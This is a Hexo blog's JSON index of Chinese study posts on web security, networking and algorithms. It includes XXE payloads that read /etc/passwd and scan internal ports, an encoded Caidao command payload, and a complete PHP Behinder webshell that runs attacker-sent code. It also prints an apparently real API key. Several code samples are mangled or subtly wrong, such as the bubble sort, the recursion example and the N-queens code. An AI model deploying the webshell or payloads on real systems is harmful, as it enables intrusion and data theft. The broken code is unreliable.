{"meta":{"title":"风景这边独好","subtitle":"小风大浪，地狱天堂","description":"我的第一个个人博客（主题样式基于Hexo）","author":"Ye-Jun","url":"http://yejuns.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2021-05-06T00:35:59.654Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"/404.html","permalink":"http://yejuns.github.io/404.html","excerpt":"","text":""},{"title":"书单","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"books/index.html","permalink":"http://yejuns.github.io/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-05-06T05:18:15.029Z","updated":"2021-05-06T05:18:15.029Z","comments":false,"path":"about/index.html","permalink":"http://yejuns.github.io/about/index.html","excerpt":"","text":"个人详细介绍 平凡的世界，不平凡的你我"},{"title":"分类","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"categories/index.html","permalink":"http://yejuns.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":true,"path":"links/index.html","permalink":"http://yejuns.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"repository/index.html","permalink":"http://yejuns.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-05-06T00:35:59.658Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"tags/index.html","permalink":"http://yejuns.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"web安全之反序列化漏洞-java","slug":"web安全之反序列化漏洞-java","date":"2021-06-14T08:01:51.000Z","updated":"2021-07-05T12:30:39.206Z","comments":true,"path":"2021/06/14/web安全之反序列化漏洞-java/","link":"","permalink":"http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/","excerpt":"","text":"1.java序列化与反序列化在Java中，只要一个类实现了java.io.Serializable接口，那么它就可以通过ObjectInputStream与ObejctOutputStream序列化. 2.漏洞原因当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码，比如 123456//读取输入流,并转换对象InputStream in=request.getInputStream();ObjectInputStream ois = new ObjectInputStream(in);//恢复对象ois.readObject();ois.close(); 暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以构造反序列化对象并执行恶意代码 3、案例 Apache Commons Collections反序列化漏洞详解 shiro反序列化漏洞其实自己还是有点没看明白，大概理解是使用gadget触发相关漏洞，但有部分细节还不了解","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"计算机网络复习笔记","slug":"计算机网络-复习笔记","date":"2021-05-01T13:01:21.000Z","updated":"2021-07-04T08:54:40.527Z","comments":true,"path":"2021/05/01/计算机网络-复习笔记/","link":"","permalink":"http://yejuns.github.io/2021/05/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ARP协议arp协议即地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。它可以解决同一个局域网内主机或路由器的IP地址和MAC地址的映射问题。 arp协议在TCP/IP模型中属于IP层(网络层),原因在于ARP协议属于TCP/IP协议簇，而在TCP/IP模型中，所有定义的协议至少是在网际层（或称网络层，IP层） 在OSI模型中属于链路层,按照OSI的标准,当数据向下传递时,每层会加上自己的信息,各层互不干扰.这样当网络层的IP包进入链路层时,链路层该如何加这个头部的目标信息呢?它要依靠ARP协议来完成.显然如何加链路头并不是网络层的功能。而且，ARP协议工作时，并不使用IP的包头。所以也有很多人说，ARP是链路层的 TCP连接与断开TCP状态（SYN、FIN、ACK） SYN(Synchronize) 建立连接 FIN 断开连接 ACK 表示响应 PSH 有DATA数据传输 RST 连接重置 如果出现SYN/FIN包的组合，很有可能这是一个攻击，因为SYN和FIN不应该一起出现 三次握手过程1、（B）-&gt;[SYN] -&gt; (A) 当客户机B和服务器A通信时，B首先向A发送一个SYN标识的包，告诉A建立连接；(SYN包就是仅SYN标记标为1的TCP包) 2、（B）&lt;-[SYN/ACK] &lt;- (A) 接着，A收到后会发一个对SYN包的确定包（SYN/ACK）回去，表示对第一个SYN包的确定，并继续握手协议 3、（B）-&gt;[ACK] -&gt; (A)B收到SYN/ACK包，B发一个确认包（ACK），通知连接已经建立。至此，三次握手完成。 四次挥手过程1、(B) -&gt; FIN+ack -&gt; (A) 2、(B) &lt;- ACK &lt;- (A) 3、(B) &lt;- FIN+ACK &lt;- (A) 4、(B) -&gt; ACK -&gt; (A) 因为TCP连接是双向连接，因此关闭连接需要在两个方向上做。 四次挥手不是关闭TCP连接的唯一方式，有时主机需要尽快关闭连接（或连接超时、主机不可达），RST包将被发送，因为RST包是不需要接收方确认的，所以RST包对于ACK可带可不带。 HTTPS建立连接的过程https是在http的基础上和ssl/tls证书结合的一种协议，保证了传输过程中的安全性，解决了http的3个缺点（被监听、被篡改、被伪装） http与httpsHTTP和HTTPS都建立在连接的基础上进行数据传输，都基于TCP，建立连接都要经过3次握手 当在浏览器中输入地址后，会先根据浏览器DNS缓存、本地DNS缓存、和HOST中寻找对应的记录，如果没有找到会请求DNS服务来获取对应的ip 建立连接的过程 客户端发送请求到服务器，告诉自己支持的加密协议以及版本 服务端选择合适的加密协议，返回一个证书给客户端，证书里面有公钥 客户端接收公钥后验证证书的安全性，如果通过会生成一个随机数，用公钥对其机密后发送到服务端;(随机数产生的原因是减少公钥加密计算量太大所消耗的时间) 服务端接收到加密后的随机数，用私钥解密后得到真正的随机数，然后用这个随机数当秘钥（对称秘钥）对需要发送的数据进行加密 客户端接收到加密的数据后使用生成的随机数（对称秘钥）对数据进行解密，将结果呈现","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"web安全之XSS蠕虫","slug":"web安全之XSS蠕虫","date":"2021-04-21T03:01:51.000Z","updated":"2021-07-04T06:48:02.274Z","comments":true,"path":"2021/04/21/web安全之XSS蠕虫/","link":"","permalink":"http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/","excerpt":"","text":"xss蠕虫一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。 XSS蠕虫一般原理 基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。 发送伪装的邀请链接。 用户点击链接被感染。 新感染用户的向好友发送伪装的邀请链接。 Samy 蠕虫","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"爬虫过验证码","slug":"爬虫之过验证码","date":"2021-04-09T08:01:51.000Z","updated":"2021-07-09T13:38:21.603Z","comments":true,"path":"2021/04/09/爬虫之过验证码/","link":"","permalink":"http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。 1、使用pytesseract模块和PIL模块识别使用pip安装相关的包 12pip install pytesseractpip install pil 整个验证码识别的思路很简单： 截取整个界面 获取验证码位置的坐标，并截取对应位置的图片 使用pytesseract模块进行验证 主要的功能代码如下： 12345678910111213141516171819202122#打开谷歌浏览器 browser = webdriver.Chrome() #打开首页 browser.get(&quot;http://localhost:8080/jpress/user/register&quot;) browser.maximize_window() #获取验证码图片 t = time.time() picture_name1 = str(t)+&#x27;.png&#x27; browser.save_screenshot(picture_name1) ce = browser.find_element_by_id(&quot;captchaimg&quot;) print(ce.location) left = ce.location[&#x27;x&#x27;] top = ce.location[&#x27;y&#x27;] right = ce.size[&#x27;width&#x27;] + left height = ce.size[&#x27;height&#x27;] + top im = Image.open(picture_name1) # 抠图 img = im.crop((left,top,right, height)) t = time.time() picture_name2 = str(t)+&#x27;.png&#x27; img.save(picture_name2)#这里就是截取到的验证码图片 browser.close() pytesseract虽然很简单直观，但是无法处理比较复杂的验证码。这时候其实我们还可以使用一些方法对图片进行处理，提供识别率。比如对截取的图片转为灰度，将有效信息转为黑，背景和干扰转为白色。 由于我们需要找到一个像素阈值能够将灰度图片中真实数据和背景干扰分开，因此这一步骤可以借助PS等工具，我们在这里设置为200 1234567891011img = image_obj.convert(&quot;L&quot;) # 转灰度图pixdata = img.load()w, h = img.sizethreshold = 200# 遍历所有像素，大于阈值的为黑色for y in range(h): for x in range(w): if pixdata[x, y] &lt; threshold: pixdata[x, y] =&quot; 0&quot; else:&gt;# 根据像素二值结果重新生成图片data = img.getdata()w, h = img.sizeblack_point = 0for x in range(1, w - 1): for y in range(1, h - 1): mid_pixel = data[w * y + x] if mid_pixel &lt; 50: top_pixel =&quot; data[w * (y - 1) + x]&quot; left_pixel =&quot; data[w * y + (x - 1)]&quot; down_pixel =&quot; data[w * (y + 1) + x]&quot; right_pixel =&quot; data[w * y + (x + 1)]&quot; if top_pixel &lt; 10: black_point +=&quot; 1&quot; if left_pixel &lt; 10: if down_pixel &lt; 10: if right_pixel &lt; 10: if black_point &lt; 1: img.putpixel((x, y), 255) black_point =&quot; 0&quot; img.show()&lt; code&gt; 转换前的图片 “ 转换后的图片 “ 2、使用第三方API接口帮助识别我以前是使用showapi,当然也可以选择别的方法，地址 整个验证的流程是： 下载官方提供的SDK包 在请求参数中加入自己的key 把图片和key值一起传给远程API，接收识别出的结果 12345678910111213from lib.ShowapiRequest import ShowapiRequestr = ShowapiRequest(&quot;http://route.showapi.com/184-4&quot;,&quot;272526&quot;,&quot;a924d4e982ae404b8a068b4d1c7784f2&quot; )r.addFilePara(&quot;image&quot;, &quot;test.png&quot;)r.addBodyPara(&quot;typeId&quot;, &quot;34&quot;)r.addBodyPara(&quot;convert_to_jpg&quot;, &quot;0&quot;)r.addBodyPara(&quot;needMorePrecise&quot;, &quot;0&quot;)res = r.post()result = res.textprint(result)body = res.json()[&#x27;showapi_res_body&#x27;]print(body[&#x27;Result&#x27;])# print(res.text) # 返回信息 有时候我们也可以自己使用tensorflow进行训练.","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Web安全之XXE","slug":"Web安全之XXE攻击","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-04T08:02:23.953Z","comments":true,"path":"2021/03/31/Web安全之XXE攻击/","link":"","permalink":"http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/","excerpt":"","text":"XXE漏洞XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外部实体数据进行处理时引发的安全问题。（我们提交的post数据中，body可以是application/xml的形式） XXE漏洞原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者通过向服务器注入指定的xml实体内容,从而让服务器加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。也就是说服务端接收和解析了来自客户端的xml数据,而又没有做严格的安全过滤校验,从而导致xml外部实体注入漏洞的产生。 漏洞利用通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。 以下是一个正常的XML代码POST请求示例： 1234567891011121314151617POST /vulnerable HTTP/1.1Host: www.test.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0Accept-Language: en-US,en;q=0.5Referer: https://test.com/test.htmlContent-Type: application/xmlContent-Length: 294&lt;?xml version=&quot;1.0&quot;?&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;/core&gt;&lt;/catalog&gt; 上述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”} 我们尝试编辑恶意的payload 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; 代码被解释并返回： 12345&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync... 这样，我们就变相的读取了/etc/passwd文件 端口扫描我们也可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF。 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; 尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"常用算法-排序","slug":"常用算法-排序","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-11T16:19:35.538Z","comments":true,"path":"2021/03/31/常用算法-排序/","link":"","permalink":"http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/","excerpt":"","text":"选择排序（Selection sort）每次选择最小值，然后放到待排序数组的开始位置 冒泡排序 （Bubble Sort）嵌套循环，每次查看相邻的元素，如果逆序，则交换 12345678910111213void sort(int[] num)&#123; boolean hasChange = false; // hasChange的作用是判断某次循环是否开始，方便提前结束循环 for(int i=0;i&lt;num.length-1;i++)&#123; hasChange = true; for(int j=0;j&lt;num.length-1-i;j++)&#123; if(num[j]&gt;num[j+1])&#123; sort(num[j],num[j+1]); &#125; hasChange = false; &#125; &#125;&#125; 插入排序（Insertion Sort）从前到后构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到位置并插入 123456789void sort(int[] nums) &#123; for (int i = 1, j, current; i &lt; nums.length; i++) &#123; current = nums[i]; //监视哨的作用 for (j = i - 1; j &gt;= 0 &amp;&amp; nums[j] &gt; current; j--) &#123; nums[j + 1] = nums[j]; &#125; nums[j + 1] = current; &#125;&#125; 归并排序（Merge Sort）1234567891011121314151617181920212223242526272829void sort(int[] A, int lo, int hi) &#123; if (lo &gt;= hi) return; int mid = lo + (hi - lo) / 2; sort(A, lo, mid); sort(A, mid + 1, hi); merge(A, lo, mid, hi);&#125;private void merge(int[] nums, int lo, int mid, int hi) &#123; int[] copy = nums.clone(); int k = lo, i = lo, j = mid + 1; //在合并过程中会有4种情况 while (k &lt;= hi) &#123; //左半边的都处理完了，现在需要把右半边的数拷贝过去 if (i &gt; mid) &#123; nums[k++] = copy[j++]; //右半边的都处理完了，现在需要把左半边的数拷贝过去 &#125; else if (j &gt; hi) &#123; nums[k++] = copy[i++]; //右边的数小于左边的数 &#125; else if (copy[j] &lt; copy[i]) &#123; nums[k++] = copy[j++]; //左边的数小于右边的数 &#125; else &#123; nums[k++] = copy[i++]; &#125; &#125;&#125; 快速排序（Quick sort）12345678910111213141516171819void sort(int[] nums, int lo, int hi) &#123; if (lo &gt;= hi) return; //如果只剩下最后一个元素，就直接返回 int p = partition(nums, lo, hi); //通过partition函数，使得p左边的值都比p要小，右边的都比p大 sort(nums, lo, p - 1); sort(nums, p + 1, hi);&#125;int partition(int[] nums, int lo, int hi) &#123; //随机选出一个数字，并和 hi 互换 --&gt; 此时选出进行比较的值就在 hi 处 swap(nums, randRange(lo, h i), hi); int i, j; for (i = lo, j = lo; j &lt; hi; j++) &#123; if (nums[j] &lt;= nums[hi]) &#123; swap(nums, i++, j); //注意这里是先比较，然后 ++ &#125; &#125; swap(nums, i, j); //把基准值放在i的位置，这样 i 后面的值都比i要大 return i;&#125; 拓扑排序 （Topological sort）前提：1、必须是有向图；2、图里面没有环 123456789101112131415void sort() &#123; Queue&lt;Integer&gt; q = new LinkedList(); for (int v = 0; v &lt; V; v++) &#123; if (indegree[v] == 0) q.add(v); &#125; while (!q.isEmpty()) &#123; int v = q.poll(); print(v); for (int u = 0; u &lt; adj[v].length; u++) &#123; if (--indegree[u] == 0) &#123; q.add(u); &#125; &#125; &#125;&#125; 堆排序 （Heap sort）堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。 桶排序 （Bucket sort）","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"常用算法-递归","slug":"常用算法-递归","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-08T01:50:59.690Z","comments":true,"path":"2021/03/31/常用算法-递归/","link":"","permalink":"http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/","excerpt":"","text":"递归算法是一种调⽤⾃自身函数的算法 算法模板123456789101112131415function fn(n)&#123; //第一步：判断状态和条件是否合法 if(n is invalid)&#123; return ; &#125; //第二步：判断递归是否应该结束 if(match condition)&#123; return some operation; &#125; //第三步：缩小问题规模 result1 = fn(n1); result2 = fn(n2); //第四步：整合结果 return combine(result1+result2); &#125; 实例一一条包含字母 A-Z 的消息通过以下方式进行编码 ‘A’ -&gt; 1 ‘B’ -&gt; 2 …. ‘Z’ -&gt; 26 给定一个只包含数字的非空字符串，计算解码方式的总数 123456789101112131415161718192021int count = 0;int numDecode(String s)&#123; char[] chars = s.toCharArray(s); return decode(chars,chars.length()-1);&#125;int decode(char[] chars,int index)&#123; if(index &lt;= 0)&#123; return 1; &#125; char cur = chars[index]; char pre = chars[index-1]; if(cur &gt; &#x27;0&#x27;)&#123; count = decode(chars,index-1); &#125; if(pre &lt; &#x27;2&#x27; || (pre == &#x27;2&#x27; &amp;&amp; cur &lt; &#x27;6&#x27;))&#123; count +=decode(chars,index-2); &#125; return count;&#125; 实例二中心对称数是指一个数字经过180度旋转后看起来仍然相同的数字，比如“8，11，69”。 找出所有长度为n的中心对称数 比如：输入 2 ；输出 11，69，88，96 12345678910111213141516171819202122232425// 输入的n，m相同List&lt;String&gt; cal(int n,int m)&#123; if(n&lt;0||m&lt;0||n&gt;m)&#123; throw new IllegalArgumentException(&quot;invalid input&quot;); &#125; if(n==0) return new ArrayList&lt;String&gt;(Arrays.asList(&quot;&quot;)); if(n==1) return new ArrayList&lt;String&gt;(Arrays.aslist(&quot;0&quot;,&quot;1&quot;,&quot;8&quot;)); List&lt;String&gt; list = cal(n-2,m); list&lt;String&gt; result = new ArrayList&lt;String&gt;(); for(int i=0;i&lt;list.size();i++)&#123; String s = list.get(i); if(n!=m) result.add(&quot;0&quot;+s+&quot;0&quot;); result.add(&quot;1&quot;+s+&quot;1&quot;); result.add(&quot;9&quot;+s+&quot;6&quot;); result.add(&quot;9&quot;+s+&quot;6&quot;); result.add(&quot;8&quot;+s+&quot;8&quot;); &#125; return res;&#125; 递归的优缺点缺点：需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理(还有可能出现堆栈溢出的情况)，比如参数传递需要压栈等操作，会对执行效率有一定影响 优点：代码简洁、清晰","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"常用算法-回朔","slug":"常用算法-回朔","date":"2021-03-30T08:01:51.000Z","updated":"2021-07-09T12:10:06.310Z","comments":true,"path":"2021/03/30/常用算法-回朔/","link":"","permalink":"http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/","excerpt":"","text":"回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。 算法模板1234567891011121314151617181920function fn(n)&#123; // 判断状态是否合法 if(input is invalid)&#123; return; &#125;// 判断递归是否应该结束 if(match condition)&#123; return some value; &#125;// 遍历所有可能出现的情况 for(all possible case)&#123; // 尝试下一步的可能性 solution.push(m); // 递归 result = fn(m); // 回朔到上一步 solution.pop(m); &#125;&#125; 实例一给定一个⽆重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合 candidates 中的数字可以无限制重复被选取 123456789101112131415161718192021222324252627class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; Arrays.sort(candidates); List&lt;Integer&gt; list = new ArrayList&lt;&gt;();//新建堆栈用来判断 List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;();//结果集 if (candidates == null || candidates.length == 0) return res; combin(candidates, 0, target, list, res); return res; &#125; //对数组元素（已排序）进行逐个判断以及加入结果集 private void combin(int[] candidates, int start, int target,List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res) &#123; //刚好满足则将结果存入结果集 if (target == 0) &#123; res.add(new ArrayList&lt;&gt;(list)); return; &#125; for (int i = start; i &lt; candidates.length; i ++) &#123; if (candidates[i] &lt;= target) &#123; //判断是否已经大于target list.add(candidates[i]);//将第一个元素存入 combin(candidates, i, target -candidates[i] , list, res);//继续判断进栈元素 list.remove(list.size() - 1);//不满足则将最后一个元素移除，进栈新元素判断 &#125; &#125; &#125;&#125; 实例二如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 123456789101112131415161718192021222324252627282930313233// 处在对角线上也可以进行攻击boolean check(int row,int col,int[] columns)&#123; for(int r=0;r&lt;row;r++)&#123; if(columns[r]==col || row-r == Math.abs(columns[r]-col))&#123; return false; &#125; &#125; return true;&#125;int count;int totalNQueens(int n)&#123; count = 0; backtracking(n,0,new int[n]); return count;&#125;void backtracking(int n,int row,int[] columns)&#123; if(row == n)&#123; count++; return n; &#125; for(int col=0;col&lt;n;col++)&#123; columns[row] = col; if(check(row,col,columns))&#123; backtracking(n,row+1,columns); &#125; columns[row]=-1; &#125;&#125;","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"冰蝎使用","slug":"冰蝎使用","date":"2021-03-13T02:20:11.000Z","updated":"2021-07-03T08:17:49.641Z","comments":true,"path":"2021/03/13/冰蝎使用/","link":"","permalink":"http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/","excerpt":"","text":"冰蝎“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。 加密原理 一句话木马是一般是指一段短小精悍的恶意代码，这段代码可以用作一个代理来执行攻击者发送过来的任意指令，比如最常见的eval($_REQUEST[&quot;a&quot;]);。 但是随着防御手段的发展，也出现了很多的防御工具。一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测。另一类是是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测。 而我们发送Payload被拦截的原因就在于，客户端发送的请求特征太明显，比如菜刀的payload 12caidao=Response.Write(&quot;-&gt;|&quot;);var err:Exception;try&#123;eval(System.Text.Encoding.GetEncoding(65001).GetString(System. Convert.FromBase64String(&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D&quot;)),&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(&quot;ERROR:// &quot;%2Berr.message);&#125;Response.Write(&quot;|&lt;-&quot;);Response.End();&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D虽然关键的代码采用了base64编码，但是payload中扔有多个明显的特征，比如有eval关键词，有Convert.FromBase64String，有三个参数，参数名为caidao（密码字段）、z1、z2，参数值有base64编码。根据这些特征很容易写出对应的防护规则，比如：POST请求中有Convert.FromBase64String关键字，有z1和z2参数，z1参数值为4个字符，z2参数值为base64编码字符。 冰蝎就考虑通过动态二进制编码的思路来绕过防火墙，具体流程如下： 首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器侧的Session中。 客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。 服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。 服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。 客户端解密服务器端返回的结果。 下载安装直接在github上下载，传送门 下载后直接解压，得到一个jar包，本地有java环境就可以直接运行 实战在自己的php环境中写一个一句话木马，其代码如图所示 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#x27;pass&#x27;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&#x27;k&#x27;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&#x27;k&#x27;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt; 用冰蝎连接 双击增加的链接显示出phpinfo()即成功！ 虚拟终端(在windows平台上可以是exec或者powershell) 反弹shell，这个很有用 数据库可视化功能","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"渗透之webshell","slug":"渗透之webshell","date":"2021-03-12T08:01:51.000Z","updated":"2021-07-12T12:19:41.647Z","comments":true,"path":"2021/03/12/渗透之webshell/","link":"","permalink":"http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8Bwebshell/","excerpt":"","text":"webshellwebshell是以asp、jsp、php或cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门 cgi（common gateway interface）：公共网关接口 常用的攻击方式有：直接上传文件、SQL注入、远程文件包含（RFI）、甚至使用XSS作为攻击的一部分。 如何隐藏webshell 将指令隐藏在UA，而不是放在$_POST传递命令 1&lt;?php 